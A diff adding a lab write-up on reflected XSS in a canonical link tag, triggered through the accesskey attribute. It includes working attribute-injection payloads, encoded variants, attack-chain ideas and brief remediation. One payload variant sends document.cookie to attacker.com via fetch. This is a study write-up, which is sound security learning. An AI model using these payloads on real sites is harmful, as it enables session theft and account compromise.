@@ -6276,7 +6276,7 @@ Ask:
 
 ---
 
-# 🐞 Lab 16 — Stored XSS in Anchor href Attribute (javascript: Protocol)
+# 🐞 Lab 16 - Stored XSS in Anchor href Attribute (javascript: Protocol)
 
 ---
 
@@ -6690,5 +6690,362 @@ Ask:
 👉 Can I use `javascript:`?  
 👉 Is it stored or reflected?  
 👉 Who will click it?  
+
+---
+
+# 🐞 Lab 17 - Reflected XSS in Canonical Tag (Accesskey Technique)
+
+---
+
+## 🔹 Overview
+
+Reflected Cross-Site Scripting (Reflected XSS) occurs when:
+
+- User input is sent to the server  
+- The server immediately reflects it in the response  
+- The browser interprets it as executable code  
+
+---
+
+## 🔍 Lab Conditions
+
+✔ Input is reflected in `<link rel="canonical">`  
+❌ Angle brackets (`< >`) are encoded  
+✔ Cannot inject new tags  
+
+✔ BUT attributes can be injected  
+✔ Element is non-clickable  
+
+👉 Normal event-based XSS fails  
+
+---
+
+## 🧠 Core Idea
+
+Non-clickable element + attribute injection  
+→ Need alternative trigger mechanism  
+
+---
+
+## 🧠 What This Lab Teaches
+
+- Attribute Injection  
+- Non-clickable element exploitation  
+- Keyboard-triggered execution  
+- `accesskey` abuse  
+
+---
+
+## 🔄 Flow
+
+1️⃣ User sends payload in URL  
+2️⃣ Server reflects it inside canonical tag  
+3️⃣ Browser parses attributes  
+4️⃣ User presses key combination  
+5️⃣ Event fires → JavaScript executes  
+
+---
+
+## 🪜 Lab Walkthrough
+
+---
+
+### Step 1 — Open Lab
+
+---
+
+### Step 2 — Test Reflection
+
+```
+XSS123
+```
+
+---
+
+### Step 3 — Check Response (Burp)
+
+```
+<link rel="canonical" href="https://site/?XSS123">
+```
+
+✔ Confirmed → attribute context  
+
+---
+
+### Step 4 — Try Normal Payload
+
+```
+" onclick="alert(1)
+```
+
+❌ Fails  
+Reason: element is NOT clickable  
+
+---
+
+### Step 5 — Use Accesskey Technique
+
+```
+'accesskey='x'onclick='alert(1)
+```
+
+---
+
+### Step 6 — Encode Payload
+
+```
+https://LAB-ID/?%27accesskey=%27x%27onclick=%27alert(1)
+```
+
+---
+
+### Step 7 — Resulting HTML
+
+```
+<link rel="canonical" href="' accesskey='x' onclick='alert(1)">
+```
+
+---
+
+### Step 8 — Trigger
+
+Press:
+
+```
+Windows:
+ALT + SHIFT + X
+
+Linux:
+ALT + X
+```
+
+---
+
+### Step 9 — Execution
+
+```
+alert(1)
+```
+
+💥 XSS triggered  
+
+---
+
+## 📸 Screenshot — Final Payload Execution
+
+![final-payload](../images/canonical-access-key-final-payload.png)
+
+---
+
+## 🔹 Payload Breakdown
+
+### 🎯 Payload
+
+```
+'accesskey='x'onclick='alert(1)
+```
+
+---
+
+### PART 1 — `'`
+
+Closes existing attribute value  
+
+---
+
+### PART 2 — `accesskey='x'`
+
+Creates keyboard shortcut  
+
+---
+
+### PART 3 — `onclick='alert(1)'`
+
+Injects JavaScript execution  
+
+---
+
+## 🔐 Encoded Version
+
+```
+%27accesskey=%27x%27onclick=%27alert(1)
+```
+
+---
+
+## 🪜 Execution Flow
+
+1️⃣ Payload injected into URL  
+2️⃣ Server reflects into canonical tag  
+3️⃣ Browser builds DOM  
+4️⃣ accesskey binds key  
+5️⃣ User presses shortcut  
+6️⃣ onclick fires  
+7️⃣ JavaScript executes 💥  
+
+---
+
+## 🧠 Key Learning
+
+If element is NOT clickable  
+→ Use `accesskey` to trigger execution  
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 Canonical Tag Injection
+
+```
+<link rel="canonical" href="USER_INPUT">
+```
+
+---
+
+### 🟢 Hidden Input Field
+
+```
+<input type="hidden" value="USER_INPUT">
+```
+
+Payload:
+
+```
+" accesskey="x" onclick="alert(1)
+```
+
+---
+
+### 🟢 Meta Tag Injection
+
+```
+<meta content="USER_INPUT">
+```
+
+---
+
+### 🟢 Non-clickable Containers
+
+```
+<div style="display:none">USER_INPUT</div>
+```
+
+---
+
+## 🔥 Payload Variations
+
+---
+
+### 🔴 Different Event
+
+```
+'accesskey='x'onfocus='alert(1)
+```
+
+---
+
+### 🔴 Using confirm
+
+```
+'accesskey='x'onclick='confirm(1)
+```
+
+---
+
+### 🔴 Data Exfiltration
+
+```
+'accesskey='x'onclick='fetch("https://attacker.com?c="+document.cookie)
+```
+
+---
+
+### 🔴 Case Bypass
+
+```
+'accesskey='X'onclick='alert(1)
+```
+
+---
+
+### 🔴 Mixed Encoding
+
+```
+%27accesskey=%27x%27onClick=%27alert(1)
+```
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+### 🔥 Admin Trigger
+
+Admin presses shortcut → payload executes  
+
+---
+
+### 🔥 Social Engineering
+
+“Press Alt+X to continue”  
+
+---
+
+### 🔥 Data Theft
+
+Keyboard trigger → JS → exfiltration  
+
+---
+
+### 🔥 UI Redress
+
+Combine with fake instructions  
+
+---
+
+## 🛡️ Remediation
+
+- Escape attribute values  
+- Disallow event attributes  
+- Use strict CSP  
+- Sanitize input  
+- Avoid reflecting input in `<link>`  
+
+---
+
+## 🧠 Bug Hunter Mindset
+
+Ask:
+
+- Is element clickable?  
+- If NOT → can I use keyboard?  
+- Can I inject attributes?  
+- Can I force execution?  
+
+---
+
+## 🧠 Ultimate Mental Model
+
+Find input  
+→ Find reflection  
+→ Identify context (ATTRIBUTE)  
+→ Check interaction (clickable or not)  
+→ If NOT clickable → use accesskey  
+→ Trigger via keyboard  
+→ Execute JS  
+→ Evaluate impact  
+
+---
+
+## 🎯 Final Summary
+
+✔ Attribute injection possible  
+✔ Element not clickable  
+✔ accesskey used as trigger  
+✔ onclick executed  
+✔ XSS achieved 💥  
 
 ---
